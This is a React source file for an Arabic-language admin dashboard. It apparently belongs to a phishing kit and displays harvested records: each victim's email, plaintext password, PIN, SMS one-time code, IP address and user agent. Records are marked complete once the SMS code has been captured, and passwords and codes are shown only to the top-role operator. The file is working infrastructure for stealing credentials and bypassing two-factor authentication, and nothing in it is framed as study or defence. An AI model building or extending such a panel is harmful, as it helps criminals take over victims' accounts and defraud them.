import { useLocation } from "wouter";
import { useQuery, useMutation } from "@tanstack/react-query";
import { type CollectedData } from "@shared/schema";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { LogOut, Eye, EyeOff, Users, CheckCircle2, XCircle } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";

interface AdminUser {
  id: string;
  username: string;
  role: string;
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();

  // Check if admin is logged in via session
  const { data: adminResponse, isLoading: isLoadingAdmin, error: adminError } = useQuery<{ success: boolean; admin: AdminUser }>({
    queryKey: ["/api/admin/me"],
    retry: false,
  });

  const admin = adminResponse?.admin || null;

  // Redirect to login if not authenticated
  if (adminError || (!isLoadingAdmin && !admin)) {
    setLocation("/admin/login");
    return null;
  }

  const { data: collectedDataResponse, isLoading } = useQuery<{ success: boolean; data: CollectedData[]; adminRole: string }>({
    queryKey: ["/api/admin/collected-data"],
    enabled: !!admin,
  });

  const collectedData: CollectedData[] = collectedDataResponse?.data || [];

  const logoutMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("POST", "/api/admin/logout", {});
    },
    onSuccess: () => {
      queryClient.clear();
      setLocation("/admin/login");
    },
  });

  const isAdmin = admin?.role === "admin";

  const handleLogout = () => {
    logoutMutation.mutate();
  };

  if (!admin) {
    return null;
  }

  const HiddenField = ({ value, label }: { value: string; label: string }) => {
    if (isAdmin) {
      return (
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <p className="text-sm text-muted-foreground">{label}:</p>
            <Badge variant="secondary" className="text-xs">
              <Eye className="w-3 h-3 ml-1" />
              مدير فقط
            </Badge>
          </div>
          <p className="text-sm font-mono bg-muted px-2 py-1 rounded">{value}</p>
        </div>
      );
    }
    return null;
  };

  const VisibleField = ({ value, label }: { value: string; label: string }) => (
    <div className="space-y-1">
      <p className="text-sm text-muted-foreground">{label}:</p>
      <p className="text-sm font-mono bg-muted px-2 py-1 rounded">{value}</p>
    </div>
  );

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <header className="border-b bg-card">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Users className="w-6 h-6 text-primary" />
            <div>
              <h1 className="text-xl font-bold">لوحة الإدارة</h1>
              <p className="text-sm text-muted-foreground">
                مرحباً، {admin.username}
                {isAdmin && (
                  <Badge variant="default" className="mr-2 text-xs">
                    مدير
                  </Badge>
                )}
              </p>
            </div>
          </div>
          <Button
            variant="outline"
            onClick={handleLogout}
            data-testid="button-logout"
          >
            <LogOut className="w-4 h-4 ml-2" />
            تسجيل الخروج
          </Button>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <div className="mb-6 grid grid-cols-1 md:grid-cols-3 gap-4">
          <Card>
            <CardHeader className="pb-3">
              <CardDescription>إجمالي السجلات</CardDescription>
              <CardTitle className="text-3xl">{collectedData.length}</CardTitle>
            </CardHeader>
          </Card>
          <Card>
            <CardHeader className="pb-3">
              <CardDescription>السجلات المكتملة</CardDescription>
              <CardTitle className="text-3xl">
                {collectedData.filter(d => d.smsCode).length}
              </CardTitle>
            </CardHeader>
          </Card>
          <Card>
            <CardHeader className="pb-3">
              <CardDescription>في انتظار التحقق</CardDescription>
              <CardTitle className="text-3xl">
                {collectedData.filter(d => !d.smsCode).length}
              </CardTitle>
            </CardHeader>
          </Card>
        </div>

        {!isAdmin && (
          <Card className="mb-6 bg-muted/50 border-muted">
            <CardContent className="pt-6">
              <div className="flex items-start gap-3">
                <EyeOff className="w-5 h-5 text-muted-foreground mt-0.5" />
                <div>
                  <h3 className="font-semibold mb-1">وصول محدود</h3>
                  <p className="text-sm text-muted-foreground">
                    بعض المعلومات الحساسة مخفية. فقط المدير يمكنه الوصول إلى جميع البيانات.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        <div className="space-y-4">
          <h2 className="text-2xl font-bold flex items-center gap-2">
            <Users className="w-6 h-6" />
            سجلات المستخدمين
          </h2>

          {isLoading ? (
            <Card>
              <CardContent className="py-12 text-center">
                <p className="text-muted-foreground">جاري تحميل البيانات...</p>
              </CardContent>
            </Card>
          ) : collectedData.length === 0 ? (
            <Card>
              <CardContent className="py-12 text-center">
                <p className="text-muted-foreground">لا توجد سجلات حتى الآن</p>
              </CardContent>
            </Card>
          ) : (
            collectedData.map((record) => (
              <Card key={record.id} data-testid={`card-collected-${record.id}`}>
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <CardTitle className="text-lg">{record.email}</CardTitle>
                      {record.smsCode ? (
                        <Badge variant="default" className="gap-1">
                          <CheckCircle2 className="w-3 h-3" />
                          مكتمل
                        </Badge>
                      ) : (
                        <Badge variant="secondary" className="gap-1">
                          <XCircle className="w-3 h-3" />
                          في الانتظار
                        </Badge>
                      )}
                    </div>
                    <CardDescription>
                      {format(new Date(record.createdAt), "dd MMM yyyy - HH:mm", { locale: ar })}
                    </CardDescription>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <VisibleField label="البريد الإلكتروني" value={record.email} />
                    
                    <HiddenField label="كلمة المرور" value={record.password} />
                    
                    <VisibleField label="رمز PIN" value={record.pin} />
                    
                    {record.smsCode && (
                      <HiddenField label="كود SMS" value={record.smsCode} />
                    )}
                    
                    {isAdmin && record.ipAddress && (
                      <VisibleField label="عنوان IP" value={record.ipAddress} />
                    )}
                    
                    {record.verifiedAt && (
                      <VisibleField 
                        label="تاريخ التحقق" 
                        value={format(new Date(record.verifiedAt), "dd MMM yyyy - HH:mm", { locale: ar })}
                      />
                    )}
                  </div>

                  {isAdmin && record.userAgent && (
                    <div className="pt-4 border-t">
                      <p className="text-xs text-muted-foreground mb-1">معلومات المتصفح:</p>
                      <p className="text-xs font-mono bg-muted px-2 py-1 rounded break-all">
                        {record.userAgent}
                      </p>
                    </div>
                  )}
                </CardContent>
              </Card>
            ))
          )}
        </div>
      </main>
    </div>
  );
}
